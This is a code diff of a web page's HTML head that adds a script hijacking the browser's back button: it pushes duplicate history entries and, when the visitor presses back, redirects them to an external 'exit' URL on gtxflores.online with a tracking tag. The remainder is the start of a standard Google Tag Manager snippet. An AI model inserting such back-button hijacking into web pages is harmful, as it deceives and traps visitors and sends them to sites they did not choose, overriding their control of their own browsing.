@@ -1,4 +1,18 @@
 <html class=""><head>
+	
+		<script type="text/javascript">
+			var back_redirect_back_link = 'https://gtxflores.online/exit/?utm_source=exit1';
+
+			history.pushState({},"",location.href);
+		    history.pushState({},"",location.href);
+
+		    window.onpopstate = function(){
+		        setTimeout(function () {
+		        	location.href = back_redirect_back_link;
+		        },1);
+		    };
+		</script>
+
 	<!-- Google Tag Manager -->
 <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
 new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
